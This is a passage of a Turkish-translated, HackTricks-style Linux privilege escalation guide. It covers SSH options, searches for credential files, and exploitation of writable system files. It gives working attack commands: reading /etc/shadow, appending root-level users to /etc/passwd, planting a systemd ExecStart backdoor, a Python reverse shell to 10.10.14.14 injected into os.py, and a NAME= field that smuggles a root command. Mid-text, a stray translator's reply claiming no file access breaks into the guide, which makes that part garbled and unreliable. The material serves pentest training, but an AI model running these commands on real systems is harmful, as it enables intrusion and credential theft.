- **PasswordAuthentication:** Şifre ile authentication'a izin verilip verilmediğini belirtir. Varsayılan `no`'dur.
- **PubkeyAuthentication:** Public key authentication'a izin verilip verilmediğini belirtir. Varsayılan `yes`'dir.
- **PermitEmptyPasswords**: Şifre ile authentication'a izin verildiğinde, sunucunun boş şifreli hesaplara login izni verip vermediğini belirtir. Varsayılan `no`'dur.

### PermitRootLogin

root'un ssh ile giriş yapıp yapamayacağını belirtir, varsayılan `no`'dur. Olası değerler:

- `yes`: root password ve private key kullanarak giriş yapabilir
- `without-password` or `prohibit-password`: root yalnızca private key ile giriş yapabilir
- `forced-commands-only`: root sadece private key ile ve komut seçenekleri belirtilmişse giriş yapabilir
- `no`: hayır

### AuthorizedKeysFile

Kullanıcı doğrulaması için kullanılabilecek public keys'i içeren dosyaları belirtir. `%h` gibi tokenler içerebilir; bu tokenler kullanıcının home dizini ile değiştirilecektir. **Mutlak yolları belirtebilirsiniz** ( `/` ile başlayan) veya **kullanıcının home dizininden göreli yolları**. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, eğer "**testusername**" kullanıcısının **private** anahtarıyla giriş yapmayı denerseniz, ssh'in anahtarınızın public kısmını `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindekilerle karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda (without passphrases!) anahtar bırakmak yerine **use your local SSH keys instead of leaving keys** kullanmanıza olanak tanır. Böylece ssh ile **to a host** **jump** edebilir ve oradan, **initial host**'unuzda bulunan **key**'i **using** ederek başka bir **host**'a **jump to another** yapabilirsiniz.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Dikkat: `Host` `*` ise, kullanıcı her farklı makineye geçtiğinde o host anahtarlara erişebilecek (bu bir güvenlik sorunudur).

Dosya `/etc/ssh_config` bu **seçenekleri** **geçersiz kılabilir** ve bu yapılandırmaya izin verebilir veya engelleyebilir.\
Dosya `/etc/sshd_config`, `AllowAgentForwarding` anahtar kelimesiyle ssh-agent forwarding'e **izin verebilir** veya **engelleyebilir** (varsayılan: izinli).

Eğer bir ortamda Forward Agent yapılandırıldığını görürseniz, aşağıdaki sayfayı okuyun çünkü **bunu kötüye kullanarak ayrıcalıkları yükseltebilirsiniz**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

Dosya `/etc/profile` ve `/etc/profile.d/` altındaki dosyalar, bir kullanıcı yeni bir shell çalıştırdığında **çalıştırılan script'lerdir**. Bu nedenle, bunlardan herhangi birini **yazabiliyor veya değiştirebiliyorsanız ayrıcalıkları yükseltebilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Herhangi bir şüpheli profile script bulursanız, **hassas ayrıntılar** için kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isimle tutuluyor olabilir veya bir yedeği mevcut olabilir. Bu yüzden **tümünü bulmanız** ve dosyaları **okuyup okuyamadığınızı kontrol etmeniz**; dosyaların içinde **hashes olup olmadığını** görmek önerilir:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğer) dosyası içinde **password hashes** bulabilirsiniz.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

Önce, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Bu dosyaya erişimim yok — lütfen src/linux-hardening/privilege-escalation/README.md içeriğini buraya yapıştırın.  

Ayrıca "Then add the user `hacker` and add the generated password." kısmı için netleştirme gerekli:
- Ben sizin için rastgele bir parola mu üreteyim? (İstiyorsanız uzunluk ve karmaşıklık kurallarını belirtin — ör. 16 karakter, büyük/küçük/numara/özel.)
- Yoksa zaten var olan bir parolayı mı eklememi istiyorsunuz? (Parolayı verin.)
  
Not: Çeviride kod, yollar, linkler, markdown/html etiketleri ve teknik terimleri değiştirmeyeceğim. İçeriği yapıştırdıktan sonra çeviriyi yapıp, eğer onaylarsanız kullanıcı oluşturma komutunu (veya komut içinde yer alacak parola) eklerim.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örneğin: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\ UYARI: makinenin mevcut güvenliğini zayıflatabilirsiniz.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur, ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı hassas dosyalara **yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bazı **service configuration file**'lara yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, eğer makinede bir **tomcat** sunucusu çalışıyorsa ve **/etc/systemd/ içinde Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız,** o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacak.

### Klasörleri Kontrol Edin

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Tuhaf Konum/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakikada değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyalar
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH'teki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Passwords içeren bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin, passwords içerebilecek birkaç olası dosya arar.\
**Kullanabileceğiniz diğer ilginç araç**: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — Windows, Linux & Mac için yerel bir bilgisayarda depolanan çok sayıda passwords'i elde etmek için kullanılan açık kaynaklı bir uygulamadır.

### Logs

Eğer logs okuyabiliyorsanız, içlerinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar garipse, muhtemelen o kadar ilginç olur.\
Ayrıca, bazı "**bad**" yapılandırılmış (backdoored?) **audit logs** size, bu yazıda açıklandığı gibi, passwords'ları audit logs içine kaydetme imkânı verebilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Logs okumak için** [**adm**](interesting-groups-linux-pe/index.html#adm-group) grubu gerçekten faydalı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Genel Creds Arama/Regex

Ayrıca adı veya içeriği içinde "**password**" kelimesini içeren dosyaları kontrol etmelisiniz, ve loglar içinde IP'leri ve e-postaları veya hash'leri regexlerle kontrol edin.\
Burada bunların hepsinin nasıl yapıldığını listelemeyeceğim ama ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir python script'in **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyorsanız** ya da **python libraries**'i değiştirebiliyorsanız, OS kütüphanesini değiştirip backdoor ekleyebilirsiniz (python script'in çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).

Kütüphaneye **backdoor eklemek** için os.py kütüphanesinin sonuna aşağıdaki satırı ekleyin (IP ve PORT'u değiştirin):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate istismarı

Bir `logrotate` güvenlik açığı, bir günlük dosyası veya üst dizinlerinde **yazma izinlerine** sahip kullanıcıların potansiyel olarak yükseltilmiş ayrıcalıklar elde etmesine izin verir. Bunun nedeni, genellikle **root** olarak çalışan `logrotate`'in özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde keyfi dosyalar çalıştıracak şekilde manipüle edilebilmesidir. İzinleri yalnızca _/var/log_ içinde değil, ayrıca log rotasyonu uygulanan herhangi bir dizinde de kontrol etmek önemlidir.

> [!TIP]
> Bu güvenlik açığı `logrotate` sürüm `3.18.0` ve daha eski sürümleri etkiler

Güvenlik açığı hakkında daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu güvenlik açığını [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu güvenlik açığı [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** ile çok benzerdir, bu yüzden günlükleri değiştirebildiğinizi her bulduğunuzda, bu günlükleri kimin yönettiğini kontrol edin ve günlükleri symlinklerle değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinizi test edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Güvenlik açığı referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Eğer, herhangi bir nedenle, bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine bir `ifcf-<whatever>` scriptini **yazabiliyorsa** **veya** mevcut bir tanesini **düzenleyebiliyorsa**, sisteminiz **pwned** olur.

Network scriptleri, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tamamen .INI dosyalarına benzerler. Ancak Linux'ta Network Manager (dispatcher.d) tarafından \~sourced\~ edilirler.

Benim durumumda, bu network scriptlerindeki `NAME=` ataması doğru şekilde işlenmiyor. Eğer isimde **boşluk (white/blank space)** varsa sistem **boşluktan sonraki kısmı yürütmeye çalışır**. Bu, **ilk boşluktan sonraki her şeyin root olarak çalıştırılması** demektir.

Örneğin: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network ile /bin/id arasında boşluk olduğunu unutmayın_)

### **init, init.d, systemd ve rc.d**

The directory `/etc/init.d` is home to **betikler** for System V init (SysVinit), the **klasik Linux servis yönetim sistemi**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

On the other hand, `/etc/init` is associated with **Upstart**, a newer **service management** introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit scripts are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.

**systemd** modern bir init ve servis yöneticisi olarak ortaya çıkar; isteğe bağlı daemon başlatma, automount yönetimi ve sistem durumu anlık görüntüleri gibi gelişmiş özellikler sunar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` dizinlerine organize eder, böylece sistem yönetimini kolaylaştırır.

## Diğer Hileler

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks genellikle ayrıcalıklı kernel fonksiyonelliğini bir userspace manager'a açmak için bir syscall'e hook koyar. Zayıf manager kimlik doğrulaması (ör. FD-order'a dayanan imza kontrolleri veya zayıf parola şemaları) yerel bir uygulamanın manager'ı taklit etmesine ve zaten-rootlu cihazlarda root'a yükselmesine olanak sağlayabilir. Daha fazla bilgi ve istismar detayları burada:

{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations içindeki regex-driven service discovery, process komut satırlarından bir binary yolunu çıkarıp ayrıcalıklı bir bağlamda `-v` ile çalıştırabilir. İzin verici desenler (ör. \S kullanımı) yazılabilir konumlardaki (ör. /tmp/httpd) saldırgan tarafından yerleştirilmiş dinleyicilerle eşleşebilir ve bunun sonucunda root olarak çalıştırılmaya yol açabilir (CWE-426 Untrusted Search Path).

Daha fazla bilgi ve diğer discovery/monitoring stack'lerine uygulanabilir genelleştirilmiş deseni görmek için buraya bakın:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Güvenlik Koruması

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux yerel privilege escalation vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve macOS'ta kernel zafiyetlerini tarar [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referanslar

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
